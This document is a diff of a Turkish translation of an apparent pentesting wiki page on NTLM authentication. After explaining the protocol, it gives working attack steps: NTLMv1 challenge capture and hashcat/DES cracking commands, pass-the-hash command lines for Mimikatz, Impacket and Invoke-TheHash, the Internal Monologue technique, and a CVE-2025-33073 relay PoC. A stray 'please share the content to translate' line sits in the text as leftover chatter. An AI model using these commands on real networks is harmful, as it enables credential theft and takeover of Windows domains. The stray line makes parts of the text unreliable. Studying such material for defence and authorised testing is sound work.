@@ -5,17 +5,17 @@
 
 ## Temel Bilgiler
 
-**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinir. `AAD3B435B51404EEAAD3B435B51404EE` özel LM hash'i, LM'nin kullanılmadığı durumu belirtir ve boş bir dizenin hash'idir.
+**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinir. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığını gösterir ve boş bir dizenin hash'ini temsil eder.
 
-Varsayılan olarak, birincil yöntem **Kerberos** kimlik doğrulama protokolüdür. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, domain'in mevcut olmaması, hatalı yapılandırma nedeniyle Kerberos'un çalışmaması veya geçerli bir hostname yerine IP adresi kullanılarak bağlantı kurulmaya çalışılması.
+Varsayılan olarak, öncelikli yöntem **Kerberos** kimlik doğrulama protokolüdür. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, etki alanının mevcut olmaması, yanlış yapılandırma nedeniyle Kerberos'un çalışmaması veya geçerli bir hostname yerine IP adresi kullanılarak bağlantı kurulmaya çalışılması.
 
-Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, NTLM kimlik doğrulama sürecine işaret eder.
+Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, NTLM kimlik doğrulama sürecini gösterir.
 
-LM, NTLMv1 ve NTLMv2 kimlik doğrulama protokollerinin desteği, `%windir%\Windows\System32\msv1\_0.dll` konumundaki belirli bir DLL tarafından sağlanır.
+LM, NTLMv1 ve NTLMv2 kimlik doğrulama protokolleri için destek, `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.
 
 **Önemli Noktalar**:
 
-- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) LM'nin kullanılmadığını gösterir.
+- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) bu hash'in kullanılmadığını gösterir.
 - Varsayılan kimlik doğrulama yöntemi Kerberos'tur; NTLM yalnızca belirli koşullarda kullanılır.
 - NTLM kimlik doğrulama paketleri "NTLMSSP" başlığından tanınabilir.
 - LM, NTLMv1 ve NTLMv2 protokolleri `msv1\_0.dll` sistem dosyası tarafından desteklenir.
@@ -26,11 +26,11 @@ Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsini
 
 ### GUI
 
-_secpol.msc_ dosyasını çalıştırın -> Yerel İlkeler -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Manager kimlik doğrulama düzeyi. 6 düzey vardır (0'dan 5'e).
+_secpol.msc_ dosyasını çalıştırın -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 düzey vardır.
 
-![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc dosyasını çalıştırın - Yerel İlkeler - Güvenlik Seçenekleri - Ağ Güvenliği: LAN Manager kimlik doğrulama düzeyi. 6 düzey vardır (0'dan 5'e)](<../../images/image (919).png>)
+![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc dosyasını çalıştırın - Local policies - Security Options - Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 düzey vardır](<../../images/image (919).png>)
 
-### Kayıt Defteri
+### Registry
 
 Bu, düzeyi 5 olarak ayarlar:
 
@@ -56,39 +56,39 @@ Olası değerler:
 3. **Sunucu** **challenge** gönderir
 4. **İstemci**, **challenge** değerini anahtar olarak parolanın hash'ini kullanarak **şifreler** ve yanıt olarak gönderir
 5. **Sunucu**, **domain adını, kullanıcı adını, challenge değerini ve yanıtı** **Domain controller**'a gönderir. Active Directory yapılandırılmamışsa veya domain adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
-6. **Domain controller, her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir
+6. **Domain controller her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir
 
-**Sunucu** ve **Domain Controller**, Domain Controller sunucunun parolasını bildiğinden (parola **NTDS.DIT** veritabanında bulunur), **Netlogon** sunucusu aracılığıyla bir **Secure Channel** oluşturabilir.
+**Sunucu** ve **Domain Controller**, Domain Controller sunucunun parolasını bildiğinden (**NTDS.DIT** db içindedir), Netlogon sunucusu aracılığıyla bir **Secure Channel** oluşturabilir.
 
 ### Yerel NTLM kimlik doğrulama şeması
 
-Kimlik doğrulama, **önce** belirtilenle aynıdır; ancak **sunucu**, **SAM** dosyasında kimlik doğrulamaya çalışan kullanıcının hash'ini bilir. Bu nedenle, Domain Controller'a sormak yerine **sunucu kullanıcının kimlik doğrulaması yapıp yapamayacağını kendisi kontrol eder**.
+Kimlik doğrulama, **sunucunun** **SAM** dosyasında kimlik doğrulamaya çalışan kullanıcının hash'ini bilmesi dışında, **önce** bahsedilenle aynıdır. Bu nedenle **sunucu**, Domain Controller'a sormak yerine kullanıcının kimlik doğrulaması yapıp yapamayacağını **kendisi kontrol eder**.
 
 ### NTLMv1 Challenge
 
-**Challenge uzunluğu 8 byte**, **yanıt uzunluğu ise 24 byte**'tır.
+**Challenge uzunluğu 8 bayttır** ve **yanıtın uzunluğu 24 bayttır**.
 
-**NT hash'i (16 byte)**, her biri 7 byte olan **3 parçaya** bölünür (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla **ayrı ayrı şifrelenir** ve şifrelenmiş **sonuçlar** birleştirilir. Toplam: 8B + 8B + 8B = 24 byte.
+**NT hash'i (16 bayt)**, her biri 7 bayt olan **3 parçaya** ayrılır (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla ayrı ayrı **şifrelenir** ve **şifrelenmiş sonuç baytları** birleştirilir. Toplam: 8B + 8B + 8B = 24Bytes.
 
 **Sorunlar**:
 
 - **Rastgelelik** eksikliği
-- NT hash'i bulmak için 3 parça **ayrı ayrı saldırıya uğratılabilir**
+- NT hash'ini bulmak için 3 parça **ayrı ayrı saldırıya uğratılabilir**
 - **DES kırılabilir**
 - 3. anahtar her zaman **5 sıfırdan** oluşur.
-- **Aynı challenge** verildiğinde **yanıt** da **aynı** olur. Böylece kurbana challenge olarak "**1122334455667788**" dizesini verebilir ve kullanılan yanıtı **önceden hesaplanmış rainbow table'lar** ile saldırıya uğratabilirsiniz.
+- **Aynı challenge** verildiğinde **yanıt** da **aynı** olur. Bu nedenle kurbana challenge olarak "**1122334455667788**" dizesini verebilir ve kullanılan yanıtı **önceden hesaplanmış rainbow table'ları kullanarak** saldırıya uğratabilirsiniz.
 
 ### NTLMv1 saldırısı
 
-Unconstrained delegation modern ortamlarda daha az yaygındır; ancak erişilebilir bir **Print Spooler service**, kimlik doğrulamayı böyle bir host'a zorlamak için hâlâ kötüye kullanılabilir.
+Unconstrained delegation modern ortamlarda daha az yaygındır, ancak erişilebilir bir **Print Spooler service** yine de böyle bir host'a kimlik doğrulamayı zorlamak için kötüye kullanılabilir.
 
-AD'de zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak **yazıcıdan kontrolünüz altındaki bir host'a karşı kimlik doğrulaması yapmasını isteyebilirsiniz**. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama challenge değerini 1122334455667788 olarak ayarlayabilir**, kimlik doğrulama girişimini yakalayabilir ve girişim **NTLMv1** kullanılarak yapıldıysa **parolayı kırabilirsiniz**.\
-`responder` kullanıyorsanız, kimlik doğrulamayı **downgrade** etmeyi denemek için **`--lm` flag'ini kullanmayı** deneyebilirsiniz.\
-_Bu tekniğin çalışması için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerekir (NTLMv2 geçerli değildir)._
+AD üzerinde zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak **yazıcıdan kontrolünüz altındaki bir host'a karşı kimlik doğrulaması yapmasını** isteyebilirsiniz. Ardından `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama challenge değerini 1122334455667788 olarak ayarlayabilir**, kimlik doğrulama girişimini yakalayabilir ve NTLMv1 kullanılarak gerçekleştirilmişse **parolayı kırabilirsiniz**.\
+`responder` kullanıyorsanız kimlik doğrulamayı **downgrade etmeyi** denemek için **`--lm` flag'ini** kullanabilirsiniz.\
+_Bu teknik için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerektiğini unutmayın (NTLMv2 uygun değildir)._
 
-Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele parolalara** sahip olduğunu; bu parolaları yaygın **sözlükleri** kullanarak **muhtemelen kıramayacağınızı** unutmayın. Ancak **NTLMv1** kimlik doğrulaması **DES** kullanır ([daha fazla bilgi](#ntlmv1-challenge)); bu nedenle DES kırmaya özel olarak ayrılmış bazı hizmetleri kullanarak parolayı kırabilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).
+Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele parolalar** kullandığını, bu parolaları yaygın **sözlükleri** kullanarak **muhtemelen kıramayacağınızı** unutmayın. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya bakın](#ntlmv1-challenge)); bu nedenle DES kırmaya özel bazı servisleri kullanarak parolayı kırabilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).
 
-### hashcat ile NTLMv1 saldırısı
+### Hashcat ile NTLMv1 saldırısı
 
 NTLMv1, yakalanan NTLMv1 mesajlarını Hashcat'e uygun biçimlere dönüştüren [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) ile de saldırıya uğratılabilir.<sup>[[1]](#references)</sup>
 
@@ -98,7 +98,7 @@ Komut
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 
-aşağıdakini çıktı olarak verirdi:
+aşağıdaki çıktıyı üretirdi:
 
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
@@ -126,20 +126,20 @@ To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 
-Lütfen dosyaya eklenecek içeriği paylaşın.
+Lütfen çevrilecek içeriği paylaşın.
 
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
 
-hashcat'i çalıştırın (aksi takdirde bu işlem birkaç gün süreceğinden, hashtopolis gibi bir araç kullanarak dağıtık şekilde çalıştırmak en iyisidir).
+hashcat'i çalıştırın (aksi hâlde birkaç gün süreceğinden, hashtopolis gibi bir araçla dağıtık çalıştırmak en iyisidir).
 
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
-Bu durumda parolasının password olduğunu biliyoruz, bu yüzden demo amacıyla hile yapacağız:
+Bu durumda bunun parolasının password olduğunu biliyoruz, bu yüzden demo amacıyla hile yapacağız:
 
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
@@ -150,7 +150,7 @@ echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
 
-Artık crack edilmiş DES anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities'i kullanmamız gerekiyor:
+Şimdi crack edilmiş DES anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
 
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
@@ -160,7 +160,7 @@ b4b9b02e6f09a9 # this is part 1
 bd760f388b6700 # this is part 2
 ```
 
-Son olarak son bölüm:
+Son olarak, son bölüm:
 
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
@@ -176,48 +176,48 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 ### NTLMv2 Challenge
 
-**Challenge uzunluğu 8 byte'tır** ve **2 response gönderilir**: Biri **24 byte** uzunluğundadır, **diğerinin** uzunluğu ise **değişkendir**.
+**Challenge uzunluğu 8 byte'tır** ve **2 yanıt gönderilir**: Biri **24 byte** uzunluğundadır, **diğerinin** uzunluğu ise **değişkendir**.
 
-**İlk response**, **client ve domain** bileşenlerinden oluşan **string**'in **key** olarak **NT hash'in MD4 hash'i** kullanılarak **HMAC_MD5** ile şifrelenmesiyle oluşturulur. Ardından **sonuç**, **challenge**'ı **HMAC_MD5** ile şifrelemek için **key** olarak kullanılır. Buna **8 byte'lık bir client challenge** eklenir. Toplam: 24 B.
+**İlk yanıt**, **istemci ve etki alanından** oluşan **dizinin** **NT hash'in** **MD4 hash'i** kullanılarak **HMAC_MD5** ile şifrelenmesiyle oluşturulur. Ardından **sonuç**, **challenge'ı** HMAC_MD5 ile şifrelemek için **anahtar** olarak kullanılır. Buna **8 byte'lık bir client challenge** eklenir. Toplam: 24 B.
 
-**İkinci response**, **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay saldırılarını** önlemek için bir **timestamp**...)
+**İkinci yanıt**, **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**'i önlemek için bir **timestamp**...)
 
-**Başarılı bir authentication exchange içeren bir PCAP** dosyanız varsa domain, username, server challenge ve NTLMv2 response'u çıkarın, capture'ı Hashcat için biçimlendirin ve parola kurtarmayı denemek için `5600` modunu kullanın. Arşivlenmiş uygulamalı walkthrough, paket alanlarını çıkarma prosedürünü korurken Hashcat'in örnekleri şu anda kabul edilen biçimi tanımlar.<sup>[[2]](#references)[[7]](#references)</sup>
+**Başarılı bir kimlik doğrulama alışverişini içeren bir PCAP'iniz varsa**, domain, username, server challenge ve NTLMv2 yanıtını çıkarın, yakalamayı Hashcat için biçimlendirin ve parola kurtarmayı denemek için `5600` modunu kullanın. Arşivlenmiş uygulamalı kılavuz, paket alanlarını çıkarma prosedürünü içerirken Hashcat'in örnekleri güncel kabul edilen biçimi tanımlar.<sup>[[2]](#references)[[7]](#references)</sup>
 
 ## Pass-the-Hash
 
-**Kurbanın hash'ine sahip olduğunuzda**, onu **taklit etmek** için kullanabilirsiniz.\
-Bu **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde** bu **hash kullanılır.** Mimikatz'in yaptığı son seçenektir.
+**Kurbanın hash'ine sahip olduğunuzda**, bunu **onu taklit etmek** için kullanabilirsiniz.\
+Bu **hash'i kullanarak NTLM kimlik doğrulaması gerçekleştirecek** bir **araç** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i** LSASS içine **enjekte edebilirsiniz**. Böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde**, **bu hash kullanılır.** Son seçeneği mimikatz kullanır.
 
-**Pass-the-Hash saldırılarını Computer hesaplarını kullanarak da gerçekleştirebileceğinizi unutmayın.**
+**Pass-the-Hash attacks'i Computer accounts kullanarak da gerçekleştirebileceğinizi unutmayın.**
 
 ### **Mimikatz**
 
-**Administrator olarak çalıştırılmalıdır**
+**Yönetici olarak çalıştırılmalıdır**
 
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
 
-This, LSASS sağlanan kimlik bilgilerini giden ağ oturum açma işlemiyle ilişkilendirirken, mevcut yerel kullanıcı altında bir işlem başlatır. Ardından, düz metin parolayı bilmeden, `runas /netonly` komutuna benzer şekilde sağlanan kullanıcı olarak ağ kaynaklarına erişebilirsiniz.
+Bu, geçerli yerel kullanıcı altında bir process başlatırken LSASS'in sağlanan kimlik bilgilerini giden ağ oturum açma işlemiyle ilişkilendirmesini sağlar. Ardından düz metin parolayı bilmeden, `runas /netonly`'de olduğu gibi sağlanan kullanıcı olarak ağ kaynaklarına erişebilirsiniz.
 
 ### Linux'tan Pass-the-Hash
 
-Linux'tan Pass-the-Hash kullanarak Windows makinelerinde kod çalıştırabilirsiniz.\
-[**Uygulamalı Pass-the-Hash çalıştırma örneklerine bakın.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)
+Linux'tan Pass-the-Hash kullanarak Windows makinelerinde code execution elde edebilirsiniz.\
+[**Impacket PsExec ile pratik Pass-the-Hash code execution örneklerine bakın.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)
 
-### Impacket'ın derlenmiş Windows araçları
+### Impacket'ın Windows için derlenmiş araçları
 
-[Impacket Windows ikililerini buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Windows için [impacket binary'lerini buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 - **atexec.exe** (Bu durumda bir komut belirtmeniz gerekir; etkileşimli bir shell elde etmek için cmd.exe ve powershell.exe geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- Başka birçok Impacket ikilisi var...
+- Başka birçok Impacket binary'si vardır...
 
 ### Invoke-TheHash
 
-Powershell scriptlerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
+PowerShell script'lerini buradan edinebilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
 
 #### Invoke-SMBExec
 
@@ -245,7 +245,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 
 #### Invoke-TheHash
 
-Bu işlev, önceki modları bir araya getirir. **Birden fazla host** belirtebilir, seçili hedefleri hariç tutabilir ve _SMBExec, WMIExec, SMBClient_ veya _SMBEnum_ seçeneklerinden birini tercih edebilirsiniz. _**Command**_ parametresi olmadan **SMBExec** veya **WMIExec** seçerseniz, yalnızca yeterli izniniz olup olmadığını kontrol eder.
+Bu işlev önceki modları birleştirir. **Birden fazla host** belirtebilir, seçili hedefleri hariç tutabilir ve _SMBExec, WMIExec, SMBClient_ veya _SMBEnum_ seçeneklerinden birini seçebilirsiniz. _**Command**_ parametresi olmadan **SMBExec** veya **WMIExec** seçerseniz, yalnızca yeterli izniniz olup olmadığını kontrol eder.
 
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
@@ -257,13 +257,13 @@ Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100
 
 **Yönetici olarak çalıştırılmalıdır**
 
-Bu araç, mimikatz ile aynı şeyi yapar (LSASS belleğini değiştirir).
+Bu tool, mimikatz ile aynı işlemi yapar (LSASS belleğini değiştirir).
 
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
 
-### Kullanıcı adı ve parola ile Windows'ta manuel uzaktan çalıştırma
+### Kullanıcı adı ve parola ile manuel Windows uzaktan yürütme
 
 
 {{#ref}}
@@ -272,23 +272,23 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Windows Host'tan kimlik bilgilerini çıkarma
 
-Daha fazla bilgi için [**Windows Kimlik Bilgilerini Çalma**](../stealing-credentials/README.md) bölümüne bakın.
+Daha fazla bilgi için [**Windows Kimlik Bilgilerini Çalma**](../stealing-credentials/README.md) sayfasına bakın.
 
 ## Internal Monologue attack
 
-Internal Monologue Attack, saldırganın **LSASS süreciyle doğrudan etkileşime girmeden** kurbanın makinesinden NTLM hash'lerini almasını sağlayan gizli bir kimlik bilgisi çıkarma tekniğidir. Hash'leri doğrudan bellekten okuyan ve uç nokta güvenlik çözümleri veya Credential Guard tarafından sık sık engellenen Mimikatz'ın aksine, bu attack **Security Support Provider Interface (SSPI) aracılığıyla NTLM kimlik doğrulama paketine (MSV1_0) yapılan yerel çağrılardan** yararlanır. Saldırgan önce NetNTLMv1'e izin verildiğinden emin olmak için **NTLM ayarlarını düşürür** (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic). Ardından çalışan süreçlerden elde ettiği mevcut kullanıcı token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 yanıtları oluşturmak için yerel olarak NTLM kimlik doğrulamasını tetikler.<sup>[[4]](#references)</sup>
+Internal Monologue Attack, saldırganın **LSASS süreciyle doğrudan etkileşime girmeden** kurbanın makinesinden NTLM hash'lerini almasını sağlayan gizli bir kimlik bilgisi çıkarma tekniğidir. Hash'leri doğrudan bellekten okuyan ve uç nokta güvenlik çözümleri veya Credential Guard tarafından sıklıkla engellenen Mimikatz'tan farklı olarak bu saldırı, **Security Support Provider Interface (SSPI) üzerinden NTLM kimlik doğrulama paketine (MSV1_0) yapılan yerel çağrılardan** yararlanır. Saldırgan önce NetNTLMv1'e izin verildiğinden emin olmak için NTLM ayarlarını (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) **düşürür**. Ardından çalışan süreçlerden elde edilen mevcut kullanıcı token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 yanıtları oluşturmak için yerel olarak NTLM kimlik doğrulamasını tetikler.<sup>[[4]](#references)</sup>
 
-Bu NetNTLMv1 yanıtlarını yakaladıktan sonra saldırgan, **önceden hesaplanmış rainbow table'ları** kullanarak orijinal NTLM hash'lerini hızla kurtarabilir ve yanal hareket için Pass-the-Hash attack'lerine devam edebilir. Önemli olarak, Internal Monologue Attack gizli kalır; çünkü ağ trafiği oluşturmaz, kod enjekte etmez veya doğrudan bellek dökümü tetiklemez. Bu da savunmacıların saldırıyı Mimikatz gibi geleneksel yöntemlere kıyasla tespit etmesini zorlaştırır.
+Bu NetNTLMv1 yanıtları ele geçirildikten sonra saldırgan, **önceden hesaplanmış rainbow table'lar** kullanarak orijinal NTLM hash'lerini hızla elde edebilir ve yanal hareket için Pass-the-Hash saldırıları düzenleyebilir. Önemli olarak, Internal Monologue Attack gizli kalır; çünkü ağ trafiği oluşturmaz, kod enjekte etmez veya doğrudan bellek dökümleri almaz. Bu da Mimikatz gibi geleneksel yöntemlere kıyasla savunmacıların saldırıyı tespit etmesini zorlaştırır.
 
-Zorunlu güvenlik ilkeleri nedeniyle NetNTLMv1 kabul edilmezse saldırgan NetNTLMv1 yanıtı alamayabilir.
+Zorunlu güvenlik politikaları nedeniyle NetNTLMv1 kabul edilmiyorsa saldırgan NetNTLMv1 yanıtını alamayabilir.
 
-Bu durumu ele almak için Internal Monologue aracı güncellendi: NetNTLMv1 başarısız olursa **NetNTLMv2 yanıtlarını yakalamaya** devam edebilmek için `AcceptSecurityContext()` kullanarak dinamik biçimde bir sunucu token'ı edinir. NetNTLMv2'yi kırmak çok daha zor olsa da sınırlı durumlarda relay attack'lerine veya çevrimdışı brute-force'a kapı aralayabilir.
+Bu durumu ele almak için Internal Monologue aracı güncellendi: NetNTLMv1 başarısız olursa bile **NetNTLMv2 yanıtlarını ele geçirmek** için `AcceptSecurityContext()` kullanarak dinamik olarak bir sunucu token'ı edinir. NetNTLMv2'nin kırılması çok daha zor olsa da sınırlı durumlarda relay saldırılarına veya çevrimdışı kaba kuvvet saldırılarına kapı açabilir.
 
 PoC'ye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** adresinden ulaşabilirsiniz.<sup>[[4]](#references)</sup>
 
 ## NTLM Relay ve Responder
 
-**Bu attack'lerin nasıl gerçekleştirileceğine ilişkin daha ayrıntılı kılavuzu burada okuyun:**
+**Bu saldırıların nasıl gerçekleştirileceğine ilişkin daha ayrıntılı kılavuzu burada okuyun:**
 
 
 {{#ref}}
@@ -297,22 +297,22 @@ PoC'ye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/e
 
 ## Ağ yakalamasından NTLM challenge'larını ayrıştırma
 
-**Şunu kullanabilirsiniz:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **kullanabilirsiniz**
 
-## Serileştirilmiş SPN'ler aracılığıyla NTLM ve Kerberos *Reflection* (CVE-2025-33073)
+## Serileştirilmiş SPN'ler üzerinden NTLM ve Kerberos *Reflection* (CVE-2025-33073)
 
-Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) kimlik doğrulamasının SYSTEM ayrıcalıkları elde etmek için **aynı** host'a geri relay edildiği *reflection* attack'lerini önlemeye çalışan çeşitli azaltımlara sahiptir.  
+Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) kimlik doğrulamasının SYSTEM ayrıcalıkları elde etmek için **aynı** host'a geri relay edildiği *reflection* saldırılarını önlemeye çalışan çeşitli azaltımlara sahiptir.  
 
-Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki yamalarla halka açık zincirlerin çoğunu bozdu; ancak **CVE-2025-33073**, *marshalled* (serileştirilmiş) target-info içeren Service Principal Name'lerin (SPN'lerin) **SMB client tarafından nasıl kısaltıldığından** yararlanılarak korumaların hâlâ aşılabileceğini gösteriyor.<sup>[[5]](#references)[[6]](#references)</sup>
+Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki yamalarla kamuya açık zincirlerin çoğunu bozdu. Ancak **CVE-2025-33073**, *marshalled* (serileştirilmiş) hedef bilgileri içeren Service Principal Name'leri (SPN'ler) **SMB client'ın nasıl kestiğini** kötüye kullanarak bu korumaların hâlâ aşılabildiğini gösteriyor.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Hatanın özeti
-1. Saldırgan, etiketi marshalled bir SPN kodlayan bir **DNS A-record** kaydeder; ör.
+1. Saldırgan, etiketi marshalled bir SPN kodlayan bir **DNS A kaydı** oluşturur – ör.
    `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. Kurbanın bu hostname'e kimlik doğrulaması yapması sağlanır (PetitPotam, DFSCoerce vb.).
-3. SMB client, `cifs/srv11UWhRCAAAAA…` hedef dizesini `lsasrv!LsapCheckMarshalledTargetInfo` işlevine ilettiğinde `CredUnmarshalTargetInfo` çağrısı serileştirilmiş blob'u **atar** ve geriye **`cifs/srv1`** kalır.
-4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos'taki eşdeğeri), kısa host bölümü bilgisayar adıyla (`SRV1`) eşleştiği için hedefi artık *localhost* olarak kabul eder.
-5. Bunun sonucunda sunucu `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini ayarlar ve bağlama **LSASS'in SYSTEM access-token'ını** enjekte eder (Kerberos için SYSTEM işaretli bir subsession key oluşturulur).
-6. Bu kimlik doğrulamayı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host'ta tam SYSTEM yetkileri sağlar.<sup>[[5]](#references)</sup>
+2. Kurban, bu hostname'e kimlik doğrulaması yapmaya zorlanır (PetitPotam, DFSCoerce vb.).
+3. SMB client, hedef dizesi `cifs/srv11UWhRCAAAAA…` değerini `lsasrv!LsapCheckMarshalledTargetInfo` işlevine ilettiğinde, `CredUnmarshalTargetInfo` çağrısı serileştirilmiş blob'u **kaldırır** ve geriye **`cifs/srv1`** kalır.
+4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos'taki karşılığı), kısa host kısmı bilgisayar adıyla (`SRV1`) eşleştiği için hedefi *localhost* olarak değerlendirir.
+5. Sonuç olarak sunucu `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini ayarlar ve **LSASS'in SYSTEM access-token'ını** bağlama enjekte eder (Kerberos için SYSTEM işaretli bir alt oturum anahtarı oluşturulur).
+6. Bu kimlik doğrulamasını `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host'ta tam SYSTEM yetkileri sağlar.<sup>[[5]](#references)</sup>
 
 ### Hızlı PoC
 ```bash
@@ -332,19 +332,19 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
 
-### Yama ve Azaltımlar
